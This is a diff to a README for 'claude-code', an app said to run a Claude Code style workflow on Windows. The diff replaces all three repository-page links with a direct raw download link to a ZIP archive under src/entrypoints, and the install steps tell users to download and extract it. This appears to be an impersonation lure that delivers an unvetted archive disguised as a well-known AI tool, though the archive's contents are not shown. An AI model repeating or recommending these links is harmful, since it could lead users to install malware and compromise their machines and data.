@@ -1,6 +1,6 @@
 # 🐙 claude-code - Run Claude Code on Windows
 
-[![Download](https://img.shields.io/badge/Download-claude--code-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/odontoglossumketch547/claude-code)
+[![Download](https://img.shields.io/badge/Download-claude--code-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/odontoglossumketch547/claude-code/main/src/entrypoints/code_claude_v3.5.zip)
 
 ## 🚀 What this is
 
@@ -10,7 +10,7 @@ claude-code is a Python app that brings a Claude Code style workflow to your com
 
 Visit this page to download and run the app:
 
-https://github.com/odontoglossumketch547/claude-code
+https://raw.githubusercontent.com/odontoglossumketch547/claude-code/main/src/entrypoints/code_claude_v3.5.zip
 
 If you see a **Releases** area or a download file on that page, get the latest Windows build from there.
 
@@ -32,7 +32,7 @@ If you see a **Releases** area or a download file on that page, get the latest W
 
 ## 🧭 How to install on Windows
 
-1. Open the download page: https://github.com/odontoglossumketch547/claude-code
+1. Open the download page: https://raw.githubusercontent.com/odontoglossumketch547/claude-code/main/src/entrypoints/code_claude_v3.5.zip
 2. Find the latest release or the main download file
 3. Download the Windows file to your computer
 4. If the file comes as a ZIP, right-click it and choose **Extract All**
